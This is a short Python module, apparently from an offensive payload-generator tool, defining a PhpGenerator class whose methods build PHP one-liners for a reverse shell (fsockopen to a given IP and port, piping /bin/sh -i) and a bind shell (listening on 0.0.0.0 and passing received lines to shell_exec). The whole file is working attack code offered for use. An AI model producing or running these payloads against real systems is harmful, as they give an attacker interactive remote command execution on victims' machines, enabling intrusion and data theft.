"""
PHP reverse and bind shell payload generators.

Author: Mostafa Tamime
"""

from generators.base import PayloadGenerator


class PhpGenerator(PayloadGenerator):
    """Standard PHP fsockopen reverse/bind shells."""

    def reverse(self, ip: str, port: int) -> str:
        return (
            f"php -r '$sock=fsockopen(\"{ip}\",{port});"
            f'exec("/bin/sh -i <&3 >&3 2>&3");\''
        )

    def bind(self, port: int) -> str:
        return (
            f"php -r '$s=@stream_socket_server(\"tcp://0.0.0.0:{port}\");"
            f"while($c=stream_socket_accept($s))"
            f'{{while($cmd=fgets($c)){{$out=shell_exec($cmd);'
            f'fwrite($c,$out);}}}}\''
        )

    def file_extension(self) -> str:
        return ".php"
